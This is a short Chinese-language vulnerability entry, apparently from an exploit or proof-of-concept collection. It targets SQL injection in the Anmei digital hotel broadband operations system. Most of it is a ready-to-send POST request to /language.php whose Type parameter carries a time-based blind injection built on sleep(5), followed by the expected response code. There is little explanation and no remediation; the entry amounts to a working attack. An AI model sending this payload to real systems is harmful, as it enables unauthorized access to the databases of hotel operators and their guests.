# 安美数字酒店宽带运营系统SQL注入漏洞

安美数字酒店宽带运营系统 ｜ SQL注入 ｜ —
- **请求**：`POST /language.php HTTP/1.1`

**Payload**
```
EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF&Lately=555-666-0606&Search=the&SerialID=1&Type=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'&UID=add&submit=%20%E6%B7%BB%20%E5%8A%A0%20
```
- **响应特征**：200